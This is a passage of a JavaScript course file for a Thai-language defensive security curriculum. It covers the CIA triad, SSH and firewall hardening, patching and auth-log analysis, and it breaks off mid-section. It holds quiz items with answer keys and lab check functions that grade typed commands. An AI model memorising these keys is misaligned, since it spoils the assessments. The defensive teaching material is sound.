// ============================================================
//  Learning Path: Cyber Security
//  เนื้อหาแกนอยู่ในไฟล์นี้ ส่วนหลักสูตร CompTIA Security+ (Lesson 1–21)
//  แยกไว้ที่ ./cyber/secplus.js แล้วต่อท้ายแต่ละระดับด้วย withSecPlus()
// ============================================================
import { TRACK_ICONS, TRACK_EMOJI } from './icons.js';
import secplus from './cyber/secplus.js';

const node = (s, p) => {
  const parts = String(p).split('/').filter(Boolean);
  let n = s.fs;
  for (const x of parts) {
    if (!n || n.t !== 'd' || !n.children[x]) return null;
    n = n.children[x];
  }
  return n;
};
const said = (h, re) => h.some(c => re.test(c.trim()));

/** ต่อ sections / quiz / labs ของ Security+ เข้าท้ายระดับที่ตรงกัน */
const withSecPlus = (levels) => {
  Object.entries(secplus).forEach(([lv, part]) => {
    const target = levels[lv];
    if (!target) return;
    target.sections = [...(target.sections || []), ...(part.sections || [])];
    target.quiz = [...(target.quiz || []), ...(part.quiz || [])];
    target.labs = [...(target.labs || []), ...(part.labs || [])];
  });
  return levels;
};

export default {
  id: 'cyber-security',
  name: 'Cyber Security',
  icon: TRACK_ICONS['cyber-security'],
  emoji: TRACK_EMOJI['cyber-security'],
  device: 'linux-sec',
  sub: 'Defensive Security &amp; Incident Response · หลักสูตร Security+',
  desc: 'ความปลอดภัยไซเบอร์สำหรับคนดูแลระบบ — CIA Triad, การ hardening, อ่าน log หาการบุกรุก, incident response, forensics และการวางระบบเฝ้าระวังทั้งองค์กร — รวมหลักสูตร CompTIA Security+ ครบทั้ง 21 บทเรียนพร้อม Lab',

  levels: withSecPlus({
    // =========================================================
    1: {
      title: 'พื้นฐานความปลอดภัยที่ทุกคนต้องรู้',
      objectives: [
        'อธิบาย CIA Triad และนำมาใช้ตัดสินใจในงานจริงได้',
        'แยกประเภทภัยคุกคามที่เจอบ่อยในองค์กรไทย',
        'เข้าใจว่าทำไม "รหัสผ่านแข็งแรง" อย่างเดียวไม่พอ',
        'ใช้คำสั่งพื้นฐานตรวจสอบว่าใครเข้าเครื่องมาบ้าง',
      ],
      sections: [
        {
          t: 'CIA Triad — เสาสามต้นของความปลอดภัย',
          h: `
<table class="tbl">
<tr><th>หลักการ</th><th>หมายถึง</th><th>ตัวอย่างการป้องกัน</th><th>ตัวอย่างเมื่อล้มเหลว</th></tr>
<tr><td><b>Confidentiality</b><br>ความลับ</td><td>เฉพาะคนที่มีสิทธิ์เท่านั้นที่เข้าถึงข้อมูลได้</td><td>สิทธิ์ไฟล์, การเข้ารหัส, VPN, MFA</td><td>ข้อมูลลูกค้ารั่วออกไปขายในเว็บมืด</td></tr>
<tr><td><b>Integrity</b><br>ความถูกต้อง</td><td>ข้อมูลไม่ถูกแก้ไขโดยไม่ได้รับอนุญาต</td><td>checksum, digital signature, file integrity monitoring</td><td>ยอดเงินในระบบบัญชีถูกแก้</td></tr>
<tr><td><b>Availability</b><br>ความพร้อมใช้</td><td>ระบบใช้งานได้เมื่อต้องการ</td><td>backup, HA, DDoS protection, UPS</td><td>ransomware เข้ารหัสไฟล์จนทำงานไม่ได้</td></tr>
</table>
<div class="note"><b>ใช้จริงอย่างไร</b> — ทุกครั้งที่ตัดสินใจเรื่องระบบ ให้ถามว่า "การเปลี่ยนนี้กระทบ C, I หรือ A อย่างไร"<br>
ตัวอย่าง: เปิดพอร์ต RDP ออกอินเทอร์เน็ตเพื่อให้พนักงานทำงานที่บ้านสะดวก (เพิ่ม A) แต่ลด C และ I อย่างมหาศาล — ทางออกที่ถูกคือ VPN + MFA ซึ่งได้ทั้งสามอย่าง</div>
<p><b>AAA</b> — อีกชุดคำที่ต้องแยกให้ออก:</p>
<ul>
  <li><b>Authentication</b> (ยืนยันตัวตน) — คุณคือใคร? รหัสผ่าน, OTP, biometrics</li>
  <li><b>Authorization</b> (ให้สิทธิ์) — คุณทำอะไรได้บ้าง? สิทธิ์ไฟล์, role</li>
  <li><b>Accounting</b> (บันทึก) — คุณทำอะไรไปบ้าง? log, audit trail</li>
</ul>`,
        },
        {
          t: 'ภัยคุกคามที่เจอบ่อยที่สุด',
          h: `
<table class="tbl">
<tr><th>ภัยคุกคาม</th><th>วิธีทำงาน</th><th>สัญญาณเตือน</th></tr>
<tr><td><b>Phishing</b></td><td>อีเมล/SMS หลอกให้กรอกรหัสหรือกดลิงก์</td><td>โดเมนคล้ายของจริง, เร่งให้รีบทำ, ไฟล์แนบแปลก</td></tr>
<tr><td><b>Ransomware</b></td><td>เข้ารหัสไฟล์แล้วเรียกค่าไถ่</td><td>ไฟล์นามสกุลแปลก, CPU/ดิสก์พุ่ง, ไฟล์ readme เรียกค่าไถ่</td></tr>
<tr><td><b>Brute force</b></td><td>เดารหัสผ่านซ้ำ ๆ</td><td>log มี Failed password จำนวนมากจาก IP เดียว</td></tr>
<tr><td><b>Credential stuffing</b></td><td>เอารหัสที่รั่วจากเว็บอื่นมาลอง</td><td>ล็อกอินสำเร็จจากประเทศแปลก ๆ ในเวลาผิดปกติ</td></tr>
<tr><td><b>Insider threat</b></td><td>คนในองค์กรเอาข้อมูลออก</td><td>ดาวน์โหลดไฟล์ปริมาณมากผิดปกติ, เข้าถึงข้อมูลนอกหน้าที่</td></tr>
<tr><td><b>Supply chain</b></td><td>เจาะผ่านซอฟต์แวร์/ผู้ให้บริการที่เราไว้ใจ</td><td>อัปเดตจาก vendor มีพฤติกรรมแปลก</td></tr>
</table>
<div class="note warn"><b>ความจริงที่เจ็บปวด:</b> การโจมตีองค์กรส่วนใหญ่ <b>ไม่ได้</b> เริ่มจากช่องโหว่ zero-day สุดล้ำ แต่เริ่มจาก<br>
1) พนักงานคนหนึ่งกดลิงก์ใน phishing → 2) ผู้โจมตีได้บัญชีธรรมดาหนึ่งบัญชี → 3) ยกระดับสิทธิ์เพราะระบบไม่ได้แยกชั้น → 4) แพร่ไปทั้งองค์กร<br>
ดังนั้นการ patch, แยกสิทธิ์ และ MFA มีผลมากกว่าการซื้ออุปกรณ์ราคาแพง</div>`,
        },
        {
          t: 'ตรวจสอบเบื้องต้นว่าใครเข้าเครื่องมาบ้าง',
          h: `
<pre class="code">whoami                 <span style="color:#5b6b8c"># ตอนนี้เราเป็นใคร</span>
id                     <span style="color:#5b6b8c"># uid/gid และกลุ่มที่สังกัด</span>
who                    <span style="color:#5b6b8c"># ใครล็อกอินอยู่ตอนนี้</span>
w                      <span style="color:#5b6b8c"># ใครอยู่ และกำลังทำอะไร</span>
last                   <span style="color:#5b6b8c"># ประวัติการล็อกอินที่สำเร็จ</span>
lastb                  <span style="color:#5b6b8c"># ประวัติการล็อกอินที่ล้มเหลว (สำคัญมาก)</span>

<span style="color:#5b6b8c"># ดูใน log โดยตรง</span>
grep "Failed password" /var/log/auth.log
grep "Accepted"        /var/log/auth.log</pre>
<table class="tbl">
<tr><th>สิ่งที่เห็น</th><th>ตีความอย่างไร</th></tr>
<tr><td>Failed password จำนวนมากจาก IP เดียว</td><td>brute force — ควรแบน IP และพิจารณาปิด password auth</td></tr>
<tr><td>Failed แล้วตามด้วย Accepted จาก IP เดิม</td><td><b>อันตราย</b> — อาจเดารหัสสำเร็จ ต้องตรวจต่อทันที</td></tr>
<tr><td>Accepted จากประเทศ/เวลาที่ไม่ควรมีคนทำงาน</td><td>บัญชีอาจถูกยึด</td></tr>
<tr><td>มีผู้ใช้ใหม่ที่ไม่รู้จักใน /etc/passwd</td><td>ผู้โจมตีสร้างบัญชีไว้กลับเข้ามา (persistence)</td></tr>
</table>
<div class="note"><b>Least Privilege</b> — หลักที่ทรงพลังที่สุดและฟรี: ให้สิทธิ์เท่าที่จำเป็นต่อการทำงานเท่านั้น ไม่มากกว่านั้น<br>
ถ้าบัญชีที่ถูกยึดมีสิทธิ์แค่อ่านโฟลเดอร์เดียว ความเสียหายก็จำกัดอยู่แค่นั้น</div>`,
        },
      ],
      quiz: [
        { type: 'mcq', q: 'Ransomware ที่เข้ารหัสไฟล์จนใช้งานไม่ได้ กระทบหลักการใดของ CIA Triad มากที่สุด', opts: ['Confidentiality', 'Integrity', 'Availability', 'ไม่กระทบ CIA'], a: 2, why: 'ข้อมูลยังอยู่และยังเป็นความลับ แต่ใช้งานไม่ได้ = Availability เสียหาย (ถ้ามีการขโมยข้อมูลออกไปด้วยจึงจะกระทบ Confidentiality)' },
        { type: 'mcq', q: 'ข้อใดคือความต่างระหว่าง Authentication กับ Authorization', opts: ['เหมือนกัน ใช้แทนกันได้', 'Authentication = ยืนยันว่าคุณเป็นใคร, Authorization = กำหนดว่าคุณทำอะไรได้', 'Authentication ใช้กับเครื่อง Authorization ใช้กับคน', 'Authorization มาก่อน Authentication'], a: 1, why: 'ต้องยืนยันตัวตนก่อน (authentication) แล้วระบบจึงตัดสินว่าให้ทำอะไรได้ (authorization) ส่วน accounting คือการบันทึกว่าทำอะไรไป' },
        { type: 'cmd', q: 'พิมพ์คำสั่งดูประวัติการล็อกอินที่ <b>ล้มเหลว</b> บน Linux', ans: ['lastb', 'sudo lastb'], why: 'last = ล็อกอินสำเร็จ (จาก wtmp), lastb = ล็อกอินล้มเหลว (จาก btmp) — lastb คือที่แรกที่ควรดูเมื่อสงสัยว่าโดน brute force' },
        { type: 'mcq', q: 'เห็นใน auth.log ว่ามี Failed password จาก IP หนึ่ง 200 ครั้ง แล้วตามด้วย Accepted จาก IP เดียวกัน ควรตีความอย่างไร', opts: ['ปกติ ผู้ใช้ลืมรหัสผ่าน', 'น่าจะเดารหัสสำเร็จ ต้องสอบสวนบัญชีนั้นทันที', 'ระบบ log ผิดพลาด', 'ไม่ต้องสนใจถ้าเป็น IP ภายใน'], a: 1, why: 'รูปแบบ "ล้มเหลวจำนวนมากแล้วสำเร็จ" คือสัญญาณคลาสสิกของ brute force ที่สำเร็จ ต้องรีเซ็ตรหัส ตรวจ session และหาว่าทำอะไรไปบ้าง' },
        { type: 'mcq', q: 'หลัก Least Privilege หมายถึงอะไร', opts: ['ใช้รหัสผ่านสั้นที่สุดที่ระบบยอมรับ', 'ให้สิทธิ์เท่าที่จำเป็นต่อการทำงานเท่านั้น', 'ให้ทุกคนเป็น admin เพื่อความสะดวก', 'จำกัดจำนวนผู้ใช้ในระบบ'], a: 1, why: 'เมื่อบัญชีถูกยึด ความเสียหายจะจำกัดอยู่แค่สิทธิ์ที่บัญชีนั้นมี — เป็นมาตรการที่ได้ผลสูงและไม่มีค่าใช้จ่าย' },
        { type: 'multi', q: 'ข้อใดเป็นสัญญาณว่าเครื่องอาจถูกบุกรุก (เลือกทุกข้อที่ถูก)', opts: ['มีผู้ใช้ใหม่ใน /etc/passwd ที่ไม่มีใครสร้าง', 'มี process แปลกที่กิน CPU สูงตลอดเวลา', 'CPU ขึ้น 60% ตอนรัน backup ประจำคืน', 'มี cron job ที่ไม่มีใครรู้จัก'], a: [0, 1, 3], why: 'CPU สูงตอนรัน backup ตามกำหนดเป็นพฤติกรรมปกติที่อธิบายได้ — สิ่งที่น่าสงสัยคือสิ่งที่ "อธิบายไม่ได้"' },
        { type: 'mcq', q: 'ทำไม MFA ถึงสำคัญกว่าการบังคับให้รหัสผ่านยาวมาก ๆ', opts: ['เพราะรหัสยาวจำยาก', 'เพราะถึงรหัสผ่านจะรั่ว ผู้โจมตีก็ยังเข้าไม่ได้ถ้าไม่มีปัจจัยที่สอง', 'เพราะ MFA ทำให้ล็อกอินเร็วขึ้น', 'ไม่จริง รหัสยาวปลอดภัยกว่า'], a: 1, why: 'รหัสผ่านรั่วได้จากหลายทาง (phishing, data breach ของเว็บอื่น, keylogger) MFA ตัดเส้นทางเหล่านั้นเกือบทั้งหมด' },
      ],
      labs: [{
        id: 'cy-l1-recon',
        title: 'Lab 1 — ตรวจสอบเบื้องต้นว่าใครเข้าเครื่องมาบ้าง',
        brief: 'หัวหน้าฝากให้ตรวจเซิร์ฟเวอร์ตัวหนึ่งว่ามีอะไรผิดปกติไหม เริ่มจากดูว่าใครล็อกอินเข้ามาบ้าง และมีความพยายามเดารหัสผ่านหรือเปล่า',
        device: 'linux-sec',
        tasks: [
          { t: 'ดูว่าตอนนี้เราล็อกอินด้วยบัญชีอะไร', hint: 'whoami', check: (s, h) => said(h, /^whoami/i) },
          { t: 'ดู uid และกลุ่มที่บัญชีเราสังกัด', hint: 'id', check: (s, h) => said(h, /^(sudo\s+)?id\s*$/i) },
          { t: 'ดูว่าใครล็อกอินอยู่ในเครื่องตอนนี้', hint: 'who', check: (s, h) => said(h, /^who\s*$/i) },
          { t: 'ดูประวัติการล็อกอินที่สำเร็จ', hint: 'last', check: (s, h) => said(h, /^last\s*$/i) },
          { t: 'ดูประวัติการล็อกอินที่ล้มเหลว', hint: 'lastb', check: (s, h) => said(h, /^(sudo\s+)?lastb/i) },
          { t: 'ค้นหาบรรทัด Failed password ใน auth.log', hint: 'grep "Failed password" /var/log/auth.log', check: (s, h) => said(h, /grep.*failed.*auth\.log/i) },
          { t: 'ค้นหาการล็อกอินที่สำเร็จ (Accepted) ใน auth.log', hint: 'grep Accepted /var/log/auth.log', check: (s, h) => said(h, /grep.*accepted/i) },
          { t: 'ดูรายชื่อผู้ใช้ทั้งหมดในระบบ', hint: 'cat /etc/passwd | cut -d: -f1', check: (s, h) => said(h, /passwd.*cut|cut.*passwd/i) },
          { t: 'ตรวจว่ามี cron job อะไรตั้งไว้บ้าง', hint: 'crontab -l', check: (s, h) => said(h, /crontab\s+-l/i) },
        ],
      }],
    },

    // =========================================================
    2: {
      title: 'Hardening และการควบคุมการเข้าถึง',
      objectives: [
        'ลดพื้นผิวการโจมตี (attack surface) อย่างเป็นระบบ',
        'ตั้งค่า SSH และ firewall ให้ปลอดภัยตามมาตรฐาน',
        'เข้าใจการจัดการ patch และช่องโหว่',
        'แยกสิทธิ์ผู้ใช้ให้ถูกหลัก',
      ],
      sections: [
        {
          t: 'Attack Surface — ยิ่งเล็กยิ่งดี',
          h: `
<p>ทุกพอร์ตที่เปิด ทุก service ที่รัน ทุกบัญชีที่มีอยู่ คือ "ประตู" ที่ผู้โจมตีอาจใช้ได้ — งานของเราคือปิดประตูที่ไม่ได้ใช้</p>
<pre class="code"><span style="color:#5b6b8c"># 1) มีอะไรเปิดพอร์ตอยู่บ้าง</span>
ss -tulpn

<span style="color:#5b6b8c"># 2) service อะไรทำงานอยู่ และอันไหนเริ่มเองตอนบูต</span>
systemctl list-units --type=service --state=running

<span style="color:#5b6b8c"># 3) ปิดสิ่งที่ไม่ได้ใช้</span>
sudo systemctl disable --now cups
sudo systemctl disable --now avahi-daemon

<span style="color:#5b6b8c"># 4) มีบัญชีอะไรที่ล็อกอินได้บ้าง (shell ไม่ใช่ nologin)</span>
grep -v nologin /etc/passwd | cut -d: -f1

<span style="color:#5b6b8c"># 5) ไฟล์ SUID ที่อาจใช้ยกระดับสิทธิ์</span>
sudo find / -perm -4000 -type f 2&gt;/dev/null</pre>
<table class="tbl">
<tr><th>ตรวจอะไร</th><th>คำสั่ง</th><th>สิ่งที่ควรเห็น</th></tr>
<tr><td>พอร์ตที่เปิด</td><td><code>ss -tulpn</code></td><td>เฉพาะที่จำเป็น และ bind เฉพาะ interface ที่ควร</td></tr>
<tr><td>บัญชีที่ล็อกอินได้</td><td><code>/etc/passwd</code></td><td>service account ควรเป็น nologin</td></tr>
<tr><td>คนที่ใช้ sudo ได้</td><td><code>/etc/sudoers</code>, <code>getent group sudo</code></td><td>เท่าที่จำเป็น และควรระบุคำสั่งเฉพาะ</td></tr>
<tr><td>รหัสผ่านที่ไม่หมดอายุ</td><td><code>chage -l &lt;user&gt;</code></td><td>บัญชีคนควรมีนโยบายหมดอายุ</td></tr>
</table>`,
        },
        {
          t: 'SSH Hardening และ Firewall',
          h: `
<table class="tbl">
<tr><th>ตั้งค่าใน sshd_config</th><th>ป้องกันอะไร</th></tr>
<tr><td><code>PermitRootLogin no</code></td><td>บังคับให้ล็อกอินด้วยบัญชีตัวเองก่อน sudo → ได้ audit trail ว่าใครทำ</td></tr>
<tr><td><code>PasswordAuthentication no</code></td><td>ตัด brute force ทิ้งทั้งหมด (ต้องตั้ง key ให้เรียบร้อยก่อน)</td></tr>
<tr><td><code>MaxAuthTries 3</code></td><td>จำกัดจำนวนครั้งต่อการเชื่อมต่อ</td></tr>
<tr><td><code>AllowUsers ops1 admin</code></td><td>อนุญาตเฉพาะบัญชีที่ระบุ</td></tr>
<tr><td><code>ClientAliveInterval 300</code></td><td>ตัด session ที่ทิ้งค้างไว้</td></tr>
</table>
<pre class="code"><span style="color:#5b6b8c"># fail2ban — แบน IP ที่พยายามเดารหัสอัตโนมัติ</span>
sudo apt install fail2ban
sudo systemctl enable --now fail2ban
sudo fail2ban-client status

<span style="color:#5b6b8c"># firewall แบบ default deny</span>
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw enable
sudo ufw status verbose</pre>
<div class="note warn"><b>ลำดับสำคัญมาก</b> — allow SSH ก่อนเปิด firewall เสมอ และก่อนปิด password authentication ต้องทดสอบล็อกอินด้วย key ให้สำเร็จก่อน มิฉะนั้นคุณจะล็อกตัวเองออกจากเซิร์ฟเวอร์อย่างถาวร</div>`,
        },
        {
          t: 'Patch Management และช่องโหว่',
          h: `
<p>ช่องโหว่ส่วนใหญ่ที่ถูกใช้โจมตีจริง <b>มี patch ออกมาแล้วเป็นเดือนหรือเป็นปี</b> — ปัญหาไม่ใช่การไม่รู้ แต่คือการไม่ได้อัปเดต</p>
<table class="tbl">
<tr><th>คำศัพท์</th><th>ความหมาย</th></tr>
<tr><td><b>CVE</b></td><td>รหัสประจำช่องโหว่ เช่น CVE-2021-44228 (Log4Shell)</td></tr>
<tr><td><b>CVSS</b></td><td>คะแนนความรุนแรง 0–10 (9.0+ = Critical ต้องรีบแก้)</td></tr>
<tr><td><b>Zero-day</b></td><td>ช่องโหว่ที่ยังไม่มี patch</td></tr>
<tr><td><b>Exploit</b></td><td>โค้ด/วิธีที่ใช้โจมตีช่องโหว่นั้นจริง</td></tr>
<tr><td><b>Patch window</b></td><td>ช่วงเวลาที่ตกลงกับธุรกิจว่าจะปิดระบบเพื่ออัปเดตได้</td></tr>
</table>
<pre class="code">sudo apt update &amp;&amp; sudo apt upgrade          <span style="color:#5b6b8c"># Debian/Ubuntu</span>
sudo dnf upgrade --security                   <span style="color:#5b6b8c"># RHEL: เฉพาะ security update</span>
sudo lynis audit system                       <span style="color:#5b6b8c"># สแกน hardening ทั้งเครื่อง</span></pre>
<div class="note"><b>กระบวนการ patch ที่ใช้ได้จริง</b><br>
1) เก็บรายการทรัพย์สินให้ครบก่อน (ไม่รู้ว่ามีเครื่องอะไร = patch ไม่ครบแน่นอน)<br>
2) จัดลำดับตาม CVSS + ระบบนั้นเปิดสู่อินเทอร์เน็ตหรือไม่<br>
3) ทดสอบในกลุ่มนำร่องก่อน<br>
4) มีแผนถอยกลับ (rollback) เสมอ<br>
5) ยืนยันว่า patch ติดตั้งจริงหลังทำเสร็จ</div>`,
        },
      ],
      quiz: [
        { type: 'mcq', q: 'ทำไมจึงควรตั้ง <code>PermitRootLogin no</code>', opts: ['เพื่อให้ล็อกอินเร็วขึ้น', 'บังคับให้ล็อกอินด้วยบัญชีของตัวเองก่อน sudo ทำให้รู้ว่าใครทำอะไร', 'เพราะ root ไม่มีรหัสผ่าน', 'เพื่อประหยัด CPU'], a: 1, why: 'ถ้าทุกคนล็อกอินเป็น root ตรง ๆ log จะบอกได้แค่ว่า "root ทำ" แต่ไม่รู้ว่าใคร — และ root เป็นชื่อบัญชีที่ผู้โจมตีเดาก่อนเสมอ' },
        { type: 'cmd', q: 'พิมพ์คำสั่งดูว่ามี service ใดเปิดพอร์ตฟังอยู่บ้าง พร้อมชื่อ process', ans: ['ss -tulpn', 'ss -tulnp', 'sudo ss -tulpn', 'netstat -tulpn'], why: 'เป็นขั้นแรกของการลด attack surface — เห็นทุกพอร์ตที่เปิดแล้วถามว่า "อันนี้จำเป็นไหม"' },
        { type: 'mcq', q: 'CVSS 9.8 หมายถึงอะไร', opts: ['ช่องโหว่ระดับต่ำ รอ patch รอบหน้าได้', 'ช่องโหว่ระดับ Critical ควรรีบแก้โดยด่วน', 'จำนวนเครื่องที่ได้รับผลกระทบ', 'เวอร์ชันของซอฟต์แวร์'], a: 1, why: 'CVSS วัดความรุนแรง 0-10 โดย 9.0+ = Critical — และถ้าระบบนั้นเปิดสู่อินเทอร์เน็ตด้วย ยิ่งต้องเร่ง' },
        { type: 'multi', q: 'ข้อใดควรทำก่อนตั้ง <code>PasswordAuthentication no</code> (เลือกทุกข้อที่ถูก)', opts: ['ตั้ง SSH key และทดสอบล็อกอินด้วย key ให้สำเร็จ', 'เปิด session ที่สองค้างไว้เผื่อ config ผิด', 'ลบบัญชีทั้งหมดในเครื่องก่อน', 'ตรวจว่า ~/.ssh มีสิทธิ์ 700 และ private key 600'], a: [0, 1, 3], why: 'การลบบัญชีทิ้งไม่เกี่ยวข้องและอันตราย — สิ่งสำคัญคือต้องมีทางเข้าที่ใช้งานได้จริงก่อนปิดทางเดิม' },
        { type: 'cmd', q: 'พิมพ์คำสั่งค้นหาไฟล์ที่มี SUID bit ทั้งระบบ (ช่องทางยกระดับสิทธิ์ที่พบบ่อย)', ans: ['find / -perm -4000 -type f', 'sudo find / -perm -4000 -type f', 'sudo find / -perm -4000'], why: 'ไฟล์ SUID รันด้วยสิทธิ์ของเจ้าของไฟล์ ถ้ามีไฟล์ SUID ที่ไม่ควรมี ผู้โจมตีอาจใช้ยกระดับเป็น root ได้' },
        { type: 'mcq', q: 'fail2ban ทำงานอย่างไร', opts: ['สแกนไวรัสในไฟล์', 'อ่าน log หาการล็อกอินล้มเหลวซ้ำ ๆ แล้วสั่ง firewall แบน IP นั้นชั่วคราว', 'เข้ารหัสการเชื่อมต่อ SSH', 'สำรองข้อมูลอัตโนมัติ'], a: 1, why: 'ทำงานร่วมกับ log และ firewall — ปรับ maxretry / findtime / bantime ได้ตามความเหมาะสมของแต่ละองค์กร' },
        { type: 'mcq', q: 'ข้อความ "ช่องโหว่ส่วนใหญ่ที่ถูกใช้โจมตีจริงมี patch แล้ว" หมายความว่าอย่างไรกับงานเรา', opts: ['ไม่ต้องกังวลเรื่องช่องโหว่', 'การอัปเดตอย่างสม่ำเสมอมีผลป้องกันมากกว่าการซื้ออุปกรณ์ราคาแพง', 'ต้องรอ zero-day ก่อนค่อยแก้', 'ควรปิดการอัปเดตอัตโนมัติ'], a: 1, why: 'กระบวนการ patch ที่ทำสม่ำเสมอคือมาตรการที่คุ้มค่าที่สุด — แต่ต้องเริ่มจากการรู้ว่าองค์กรมีทรัพย์สินอะไรบ้าง' },
      ],
      labs: [{
        id: 'cy-l2-harden',
        title: 'Lab 2 — ลด Attack Surface และ Hardening เซิร์ฟเวอร์',
        brief: 'เซิร์ฟเวอร์ตัวนี้กำลังจะย้ายไปวางในโซนที่เข้าถึงจากอินเทอร์เน็ตได้ ต้องทำ hardening ให้ผ่านเกณฑ์ก่อน',
        device: 'linux-sec',
        tasks: [
          { t: 'ตรวจสอบพอร์ตที่เปิดฟังอยู่ทั้งหมด', hint: 'ss -tulpn', check: (s, h) => said(h, /^(sudo\s+)?(ss|netstat)/i) },
          { t: 'ดูรายการ service ที่กำลังทำงาน', hint: 'systemctl list-units', check: (s, h) => said(h, /systemctl\s+list-units/i) },
          { t: 'ค้นหาไฟล์ SUID ทั้งระบบ', hint: 'sudo find / -perm -4000 -type f', check: (s, h) => said(h, /find\s+\/\s+-perm/i) },
          { t: 'ตรวจนโยบายรหัสผ่านของผู้ใช้ <code>student</code>', hint: 'sudo chage -l student', check: (s, h) => said(h, /chage/i) },
          { t: 'สร้าง SSH key แบบ ed25519 สำหรับล็อกอินแทนรหัสผ่าน', hint: 'ssh-keygen -t ed25519', check: s => !!node(s, '/home/analyst/.ssh/id_ed25519') },
          { t: 'ตั้งสิทธิ์โฟลเดอร์ <code>~/.ssh</code> เป็น <code>700</code>', hint: 'chmod 700 /home/analyst/.ssh', check: s => node(s, '/home/analyst/.ssh')?.mode === '700' },
          { t: 'ตั้งสิทธิ์ private key เป็น <code>600</code>', hint: 'chmod 600 /home/analyst/.ssh/id_ed25519', check: s => node(s, '/home/analyst/.ssh/id_ed25519')?.mode === '600' },
          { t: 'ตั้ง firewall default เป็น deny incoming', hint: 'sudo ufw default deny incoming', check: (s, h) => said(h, /ufw\s+default\s+deny/i) },
          { t: 'อนุญาต SSH ก่อนเปิด firewall', hint: 'sudo ufw allow 22/tcp', check: s => s.ufw.rules.some(r => /22/.test(r.to)) },
          { t: 'เปิดใช้งาน firewall', hint: 'sudo ufw enable', check: s => s.ufw.active },
          { t: 'เปิดใช้งาน <code>fail2ban</code> และตั้งให้เริ่มตอนบูต', hint: 'sudo systemctl start fail2ban → sudo systemctl enable fail2ban', check: s => s.services.fail2ban.active && s.services.fail2ban.enabled },
          { t: 'สแกน hardening ทั้งเครื่องด้วย lynis', hint: 'sudo lynis audit system', check: (s, h) => said(h, /lynis/i) },
        ],
      }],
    },

    // =========================================================
    3: {
      title: 'ตรวจจับการบุกรุกและวิเคราะห์ Log',
      objectives: [
        'อ่าน log อย่างเป็นระบบเพื่อหาสิ่งผิดปกติ',
        'ใช้ pipeline ของคำสั่งวิเคราะห์ข้อมูลจำนวนมาก',
        'เข้าใจ IOC และ MITRE ATT&amp;CK เบื้องต้น',
        'ตั้งระบบ audit เพื่อให้มีหลักฐานเมื่อเกิดเหตุ',
      ],
      sections: [
        {
          t: 'อ่าน Log อย่างมีระบบ',
          h: `
<p>ปัญหาของ log ไม่ใช่ "ไม่มีข้อมูล" แต่คือ "ข้อมูลเยอะเกินจะอ่านด้วยตา" — ต้องใช้ pipeline ช่วยกรอง</p>
<pre class="code"><span style="color:#5b6b8c"># หา IP ที่พยายามเดารหัสมากที่สุด 5 อันดับ</span>
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn | head -5

<span style="color:#5b6b8c"># นับจำนวนครั้งทั้งหมด</span>
grep -c "Failed password" /var/log/auth.log

<span style="color:#5b6b8c"># ดูว่ามีใครล็อกอินสำเร็จบ้าง</span>
grep "Accepted" /var/log/auth.log

<span style="color:#5b6b8c"># ดู log ระดับ error ตั้งแต่บูตครั้งนี้</span>
journalctl -p err -b</pre>
<table class="tbl">
<tr><th>ขั้นตอน</th><th>คำสั่งที่ใช้</th><th>ได้อะไร</th></tr>
<tr><td>1. กรอง</td><td><code>grep</code></td><td>เอาเฉพาะบรรทัดที่สนใจ</td></tr>
<tr><td>2. ตัดเอาเฉพาะคอลัมน์</td><td><code>awk '{print $N}'</code>, <code>cut -d: -f1</code></td><td>เหลือแค่ IP หรือชื่อผู้ใช้</td></tr>
<tr><td>3. เรียง</td><td><code>sort</code></td><td>ให้ค่าเหมือนกันอยู่ติดกัน</td></tr>
<tr><td>4. นับซ้ำ</td><td><code>uniq -c</code></td><td>รู้ว่าอะไรเกิดกี่ครั้ง</td></tr>
<tr><td>5. เรียงตามจำนวน</td><td><code>sort -rn</code></td><td>อันที่เยอะที่สุดอยู่บนสุด</td></tr>
</table>
<div class="note"><b>Baseline คือหัวใจ</b> — คุณจะรู้ว่าอะไร "ผิดปกติ" ก็ต่อเมื่อรู้ว่าอะไร "ปกติ" ดังนั้นควรดู log ในวันที่ระบบปกติเป็นประจำ ไม่ใช่เปิดดูครั้งแรกตอนเกิดเหตุ</div>`,
        },
        {
          t: 'IOC และ MITRE ATT&amp;CK',
          h: `
<p><b>IOC (Indicator of Compromise)</b> — ร่องรอยที่บ่งชี้ว่าถูกบุกรุกแล้ว</p>
<table class="tbl">
<tr><th>ประเภท IOC</th><th>ตัวอย่าง</th></tr>
<tr><td>Network</td><td>IP/โดเมนของ C2 server, การเชื่อมต่อขาออกไปประเทศแปลก ๆ ตอนตีสาม</td></tr>
<tr><td>Host</td><td>ไฟล์แปลกใน /tmp, process ที่ไม่มีใครรู้จัก, ผู้ใช้ใหม่ที่ไม่ได้สร้าง</td></tr>
<tr><td>File</td><td>hash (SHA256) ของไฟล์มัลแวร์ที่รู้จัก</td></tr>
<tr><td>Behavior</td><td>บัญชีเดียวล็อกอินจาก 2 ประเทศห่างกัน 5 นาที (impossible travel)</td></tr>
</table>
<p><b>MITRE ATT&amp;CK</b> — แผนที่พฤติกรรมของผู้โจมตี ใช้เป็นภาษากลางในการสื่อสารและตรวจสอบว่าเรามองไม่เห็นตรงไหน</p>
<table class="tbl">
<tr><th>Tactic (เป้าหมาย)</th><th>ตัวอย่าง Technique</th><th>เราจะเห็นอะไรใน log</th></tr>
<tr><td>Initial Access</td><td>Phishing, ใช้บัญชีที่รั่ว</td><td>ล็อกอินสำเร็จจากที่แปลก</td></tr>
<tr><td>Execution</td><td>รันสคริปต์/คำสั่ง</td><td>process แปลก, audit execve</td></tr>
<tr><td>Persistence</td><td>สร้างบัญชี, cron job, service ใหม่</td><td>ผู้ใช้ใหม่, crontab เปลี่ยน, Event ID 7045 บน Windows</td></tr>
<tr><td>Privilege Escalation</td><td>ใช้ SUID, ช่องโหว่ kernel</td><td>sudo ผิดปกติ, ไฟล์ SUID ใหม่</td></tr>
<tr><td>Defense Evasion</td><td>ลบ log</td><td>log หาย, Event ID 1102 บน Windows</td></tr>
<tr><td>Exfiltration</td><td>ส่งข้อมูลออก</td><td>traffic ขาออกปริมาณมากผิดปกติ</td></tr>
</table>`,
        },
        {
          t: 'Audit และ File Integrity',
          h: `
<pre class="code"><span style="color:#5b6b8c"># เปิด auditd เพื่อบันทึกเหตุการณ์ระดับ syscall</span>
sudo systemctl enable --now auditd
sudo auditctl -l

<span style="color:#5b6b8c"># เฝ้าไฟล์สำคัญ</span>
sudo auditctl -w /etc/passwd -p wa -k identity
